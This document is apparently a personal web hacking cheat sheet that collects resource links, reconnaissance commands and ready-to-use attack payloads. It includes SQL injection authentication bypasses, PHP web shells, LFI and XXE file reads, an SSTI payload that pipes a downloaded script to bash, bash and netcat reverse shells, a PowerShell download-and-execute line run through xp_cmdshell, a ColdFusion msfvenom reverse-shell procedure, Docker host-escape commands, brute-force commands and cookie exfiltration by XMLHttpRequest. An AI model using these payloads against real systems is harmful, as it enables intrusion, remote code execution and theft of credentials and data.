# Web Hacking

## Resources

https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A6-Security_Misconfiguration  
https://pentester.land/cheatsheets/2018/11/14/subdomains-enumeration-cheatsheet.html  
https://github.com/EdOverflow/can-i-take-over-xyz#all-entries  
https://highon.coffee/blog/lfi-cheat-sheet/  
https://saadahmedx.medium.com/weaponizing-xss-for-fun-profit-a1414f3fcee9  
https://github.com/swisskyrepo/PayloadsAllTheThings  
https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf  

### The Burp Methodology
https://portswigger.net/support/the-burp-methodology  

### Javascript
```
document.getElementById
document.getElementByClassName
document.getElementsByName
document.getElementsByTagName
document.getElementsByTagNameNS

var variablename document.getElementByIdTagName("tagName").innerHTML = "-confirm(1)-"
var variablename document.getElementsByIdTagName("tagName")[0].innerHTML = "-confirm(1)-"

document.getElementById('thm-title').innerHTML = "Insert Code"
document.querySelector('#thm-title').innerHTML = "Insert Code"
document.querySelectorAll('#thm-title')
document.querySelectorAll('#thm-title').length
document.querySelectorAll('#thm-title')[0]
document.querySelectorAll('#thm-title')[0].baseURI
document.querySelectorAll('#thm-title')[0].innerHTML
document.querySelectorAll('#thm-title')[0].innerHTML = "Insert Code"
document.querySelectorAll('#thm-title')[0].innerText
document.querySelectorAll('#thm-title')[0].innerText = "Insert Code"
```

### jQuery 2.1.1
```
$.get('http://example.com/jquerypayload')
$.post('http://example.com/jquerypayload')
$.parseHTML("<img src='​http://example.com/logo_jquery_215x53.gif'>")
$.parseHTML("<img src='z' onerror='alert(\"xss\")'>")

jquerypayload
alert(document.domain);
```

### Creating Requests
```
var xhttp = new XMLHttpRequest();
xhttp.open('GET', 'URL' + document.cookie, true);
xhttp.send();
```

Thanks to @Legacyy for assisting me with the javascript breakdown

https://kapeli.com/cheat_sheets/Axios.docset/Contents/Resources/Documents/index

### XSS
Resources:

https://joecmarshall.com/posts/burp-suite-extensions-xss-validator/

https://portswigger.net/support/xss-beating-html-sanitizing-filters

https://xsshunter.com/app

https://owasp.org/www-community/xss-filter-evasion-cheatsheet

### XSS Payloads
https://github.com/payloadbox/xss-payload-list

https://github.com/pgaijin66/XSS-Payloads

### DOM Based XSS

The following few examples below was taken from the links below. These were great examples that helped me better understand the nature of DOM based XSS.

https://owasp.org/www-community/attacks/DOM_Based_XSS  
https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html  

```
http://<domain>/page.html?default=<script>alert(document.cookie)</script>
http://<domain>/page.html#default=<script>alert(document.cookie)</script>
http://<domain>/document.pdf#somename=javascript:script
```

Examples of Encoded DOM XSS payloads

```
 for(var \u0062=0; \u0062 < 10; \u0062++){
     \u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074
     .\u0077\u0072\u0069\u0074\u0065\u006c\u006e
     ("\u0048\u0065\u006c\u006c\u006f\u0020\u0057\u006f\u0072\u006c\u0064");
 }
 \u0077\u0069\u006e\u0064\u006f\u0077
 .\u0065\u0076\u0061\u006c
 \u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074
 .\u0077\u0072\u0069\u0074\u0065(111111111);
 ```

```
var s = "\u0065\u0076\u0061\u006c";
 var t = "\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029";
 window[s](t);
```

## Port scanning web server
```
nmap -sC -sV -v -p- IP
nmap -sC -sV -v -p- IP --min-rate=10000
```

## Fuzzing Websites
https://github.com/ffuf/ffuf

```
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL/FUZZ -fc 403,404,302

To filter by size
ffuf -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u $URL/FUZZ -fc 403,404,302 -fs 1000

ffuf -u http://example.com/FUZZ -e asp,html,jpg -recursion -recursion-depth 2 -w wordlist.txt
```
### Fuzzing Resources
https://github.com/chrislockard/api_wordlist/blob/master/common_paths.txt

## Subdomain Scraping
https://github.com/OWASP/Amass
```
amass enum -v -src -ip -brute -min-for-recursive 2 -o domain_list.txt -d $domain
```

### Cleaning domain list (thanks to @dee-see) for assisting on this!
```
awk '{print $2}' $1
```

### Probing domains
https://github.com/tomnomnom/httprobe
```
cat domain_list | httprobe > http_domain_list
```

### Screenshots
https://github.com/FortyNorthSecurity/EyeWitness
```
python3 /path/to/EyeWitness.py -f $1
```

### Web Crawling
https://github.com/jaeles-project/gospider

https://github.com/hakluke/hakrawler

```
gospider -S domain_list.txt --depth 2 --no-redirect -t 50 -c 3 -o gospiderdump
```

### Fuzzing Params
https://github.com/s0md3v/Arjun

https://github.com/maK-/parameth

```
arjun.py -u $url -t 10 --get --post
```

### Domain History
https://github.com/tomnomnom/waybackurls

### findings new domains using amass
https://danielmiessler.com/study/amass/

```
amass intel -ip -cidr $1
```

### capturing basic auth
```
1. sudo msfdb run
2. use auxiliary/server/capture/http_basic
3. set URIPATH abc
4. run
```

### Python secured webserver
```
https://support.microfocus.com/kb/doc.php?id=7013103

openssl req -newkey rsa:2048 -new -nodes -x509 -days 3650 -keyout key.pem -out cert.pem
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365
```

```python
import BaseHTTPServer, SimpleHTTPServer
import ssl


httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443),
        SimpleHTTPServer.SimpleHTTPRequestHandler)

httpd.socket = ssl.wrap_socket (httpd.socket,
        keyfile="/path/to/key.pem",
        certfile='/path/to/cert.pem', server_side=True)

httpd.serve_forever()
```

### lfi
https://github.com/payloadbox/rfi-lfi-payload-list  
https://github.com/p0cl4bs/kadimus  
https://github.com/mzfr/liffy  

```
param=file:///etc/passwd
param=php://filter/read=convert.base64-encode/resource=../../../../file/to/read
param=php://filter/read=string.rot13/resource=../../../file/to/read
```

### sqli
https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
```
Auth bypass
'or''='
account’-- -
or 1=1
or 1=1--
or 1=1#
or 1=1/*
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin'or 1=1 or ''='
admin' or 1=1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin') or ('1'='1'--
admin') or ('1'='1'#
admin') or ('1'='1'/*
admin') or '1'='1
admin') or '1'='1'--
admin') or '1'='1'#
admin') or '1'='1'/*
admin" --
admin" #
admin"/*
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin" or "1"="1"/*
admin"or 1=1 or ""="
admin" or 1=1
admin" or 1=1--
admin" or 1=1#
admin" or 1=1/*
admin") or ("1"="1
admin") or ("1"="1"--
admin") or ("1"="1"#
admin") or ("1"="1"/*
admin") or "1"="1
admin") or "1"="1"--
admin") or "1"="1"#
admin") or "1"="1"/*
'ad'||'min'
```

### Bruteforcing
https://github.com/frizb/Hydra-Cheatsheet  
```
hydra -l admin -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
hydra -l none -P rockyou.txt <IP> http-post-form "/path/to/login.php:username=admin&password=^PASS^:Invalid Password" -t 64 -V
hydra -l admin -P rockyou.txt -t -s 443 -f <IP> http-get /
hydra -l <USERID> -P rockyou.txt <IP> -s <PORT> http-post-form "/api/session/authenticate:{\"username\"\:\"^USER^\",\"password\"\:\"^PASS^\"}:Authentication failed:H=Content-Type\: application/json" -t 64
Example: Basic auth for tomcat
hydra -l tomcat -P passfile.txt -t -s 443 -f <IP> http-get /manager/html -s 8080
```

### php payloads
```
<?php system($_REQUEST ["cmd"]); ?>
<?php system($_GET['cmd']);?>
```

### bypassing php functions (Thanks to @dee-see and @kargha for recommending).

Resources:  
https://stackoverflow.com/questions/732832/php-exec-vs-system-vs-passthru 
https://stackoverflow.com/questions/3115559/exploitable-php-functions  
https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass

table taken from the above stackoverflow thread. This was extremely useful.

```
+----------------+-----------------+----------------+----------------+
|    Command     | Displays Output | Can Get Output | Gets Exit Code |
+----------------+-----------------+----------------+----------------+
| system()       | Yes (as text)   | Last line only | Yes            |
| passthru()     | Yes (raw)       | No             | Yes            |
| exec()         | No              | Yes (array)    | Yes            |
| shell_exec()   | No              | Yes (string)   | No             |
| backticks (``) | No              | Yes (string)   | No             |
+----------------+-----------------+----------------+----------------+
```

```
<?php echo "abcdef"; ?>
<?php echo `test`; ?>
<?php include("http://x/reverse_shell.php"); ?>
<?php include_once("http://x/reverse_shell.php"); ?>
<?php `curl "http://x"` ?>
<?php system("id");?>
<?php passthru("whoami");?>
<?php exec("/bin/ls /");?>
<?php shell_exec("whoami");?>
```

### param tampers
```
query?param=/legit/path/to/file.php/../../../../etc/passwd
```

### curl fiddling
```
curl -v -A "Mozilla Chrome Safari" -H 'host: $vhost' -k -X GET $host
curl -v -A "Mozilla Chrome Safari" -H 'host: $vhost' -k -X GET $host
```

### hashcat example hashes
https://hashcat.net/wiki/doku.php?id=example_hashes
```
hashcat -m <mode> -a 0 hashlist.txt /root/wordlist/rockyou.txt
```

### data wrappers
```
data:text/plain,This is a test
data:test/plain,<?php echo shell_exec("whoami") ?>
```
### resources
https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/exploiting-password-recovery-functionalities/  

### Pen Testing Password Resets
https://0xayub.gitbook.io/blog/

### file upload bypass
https://book.hacktricks.xyz/pentesting-web/file-upload

### php code
```
system($_REQUEST['key']);
```
### LateX injection
https://0day.work/hacking-with-latex/  
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection  

### Server Sided Template Injection
https://blog.cobalt.io/a-pentesters-guide-to-server-side-template-injection-ssti-c5e3998eae68  
https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf  

```
{% import os %}{{ os.popen("cat /etc/passwd").read() }}

Thanks to Legacyy for the recommended curl command
{% import os %}{{ os.popen("curl <IP>/shell.sh | bash").read() }}

Contents of shell.sh 
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```


### Python Pickling
https://medium.com/@shibinbshaji007/using-pythons-pickling-to-explain-insecure-deserialization-5837d2328466  
https://www.youtube.com/watch?v=HsZWFMKsM08  
https://root4loot.com/post/exploiting_cpickle/  
```
import pickle

variable = { "test" : "Test2" , "Test3" : "Test4" }

pickle.dumps(variable)
"(dp0\nS'test'\np1\nS'Test2'\np2\nsS'Test3'\np3\nS'Test4'\np4\ns."

pickle.loads("(dp0\nS'test'\np1\nS'Test2'\np2\nsS'Test3'\np3\nS'Test4'\np4\ns.")
{'test': 'Test2', 'Test3': 'Test4'}
```

### java deserialization
https://portswigger.net/web-security/deserialization

### XXE

Resources:  
https://www.youtube.com/watch?v=aQFG-97f900

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<fieldname><productId>&xxe;</productId></fieldname>

--------------------------

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

<root>
<field1>
</field1>
<field2>
</field2>
<field3>
&xxe;
</field3>
</root>

More examples

<?xml version="1.0" encoding="UTF-8" ?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>
	<table_num>2</table_num>
	<food>&test;</food>
</root>
```

### xss via file upload
https://medium.com/@lucideus/xss-via-file-upload-lucideus-research-eee5526ec5e2

### Jenkins
https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6  

### Node JS Exploit
https://wiremask.eu/writeups/reverse-shell-on-a-nodejs-application/  

> To learn more about Node JS navigate to https://www.youtube.com/watch?v=W6NZfCO5SIk, thanks to frostb1te for providing the link.

### NodeJS deserialization RCE Exploit
https://www.exploit-db.com/docs/english/41289-exploiting-node.js-deserialization-bug-for-remote-code-execution.pdf

```
_$$ND_FUNC$$_require('child_process').exec('<COMMAND_HERE>', function(error, stdout, stderr) { console.log(stdout) })
```

### Serializing a NodeJS payload
```python
var y = {
rce : function(){
require('child_process').exec('<COMMAND_HERE>', function(error,
stdout, stderr) { console.log(stdout) });
},
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));
```

### IFS Technique to replace spaces
```
<img src=http://localhost/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<LHOST>'$IFS'<LPORT>')>
```

### SQLi create webshell (Submitted by @Legacyy)
```
SELECT ("<?php echo system($_GET['cmd']); ?>") INTO OUTFILE "/var/www/html/payload.php"
```

### SQL injection using information_schema
```
SELECT * FROM information_schema.tables;
SELECT * FROM information_schema.columns;
SELECT table_name FROM information_schema.tables
SELECT column_name FROM information_schema.columns
```

### Testing sql injection using sqlfiddle
http://sqlfiddle.com/

### LDAP Injection
https://book.hacktricks.xyz/pentesting-web/ldap-injection#special-blind-ldap-injection-without

### jetdirect printer service
https://github.com/RUB-NDS/PRET  
https://www.nds.ruhr-uni-bochum.de/media/ei/arbeiten/2017/01/30/exploiting-printers.pdf  

### Bypassing 403 Forbidden Errors (Resource: https://hackerone.com/reports/991717)
```
curl -H "Content-Length:0" -X POST https://<domain>/restricted_file
```

### BruteForcing Wordpress

```
wpscan -U <username> -P wordlist.txt --url http://url/wordpress
```

### pentesting wordpress
https://book.hacktricks.xyz/pentesting/pentesting-web/wordpress

```
use exploit/unix/webapp/wp_admin_shell_upload
use exploit/unix/webapp/wp_slideshowgallery_upload
```

### Uploading malicious plugin for Wordpress
```
Path to the malicious plugin
/usr/share/SecLists/Web-Shells/WordPress/plugin-shell.php

Packing your plugin
zip plugin-shell.zip plugin-shell.php
```

### Using xp_cmdshell to run a powershell script on MSSQL (thanks to @sinfulz for recommending this)

```
xp_cmdshell powershell IEX(New-Object Net.WebClient).downloadstring("http://<IP>/powershellscript.ps1")
```

### Adobe Cold Fusion
https://www.carnal0wnage.com/papers/LARES-ColdFusion.pdf

### Retrieving password configuration from Cold Fusion 8
```
Retrieving the credentials from the coldfusion configuration file.
/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../ColdFusion8/lib/password.properties%00en
```

### Exploiting Cold Fusion 8 (Authenticated)

```
1. Login to Cold Fusion.
2. Create a scheduled task under Debugging and Logging.
3. Provide Task Name
4. Create your jsp payload msvenom -p java/jsp_shell_reverse_tcp lhost=10.10.14.30 lport=32115 -f raw > x.jsp
5. URL enter your http server with the malicious reverse_tcp jsp http://x.x.x.x/x.jsp
6. username and password of cold fusion account.
7. check publish (Save output to a file)
8. File should be your outdirectory C:\ColdFusion8\wwwroot\CFIDE\x.jsp
9. Run your scheduled task
10. Setup your netcat listener nc -nvlp 32115
11. Navigate to http://targetsite/CFIDE/x.jsp execute your reverse_tcp
```

### Using cewl to generate wordlists
https://tools.kali.org/password-attacks/cewl

```
cewl -w wordlist.txt -d 2 -m <IP_ADDRESS>
```

### Docker shell
```
docker -H <IP>:<PORT> exec -it <container> /bin/bash

docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt sh
docker -H <IP>:<PORT> run -v /:/mnt --rm -it alpine:<version> chroot /mnt /bin/bash
```

### Unicode Cheatsheet thanks to @dee-see for suggesting the link
https://gosecure.github.io/unicode-pentester-cheatsheet/

### LFI log poisoning (Recommended by 5h4d3)

https://shahjerry33.medium.com/rce-via-lfi-log-poisoning-the-death-potion-c0831cebc16d

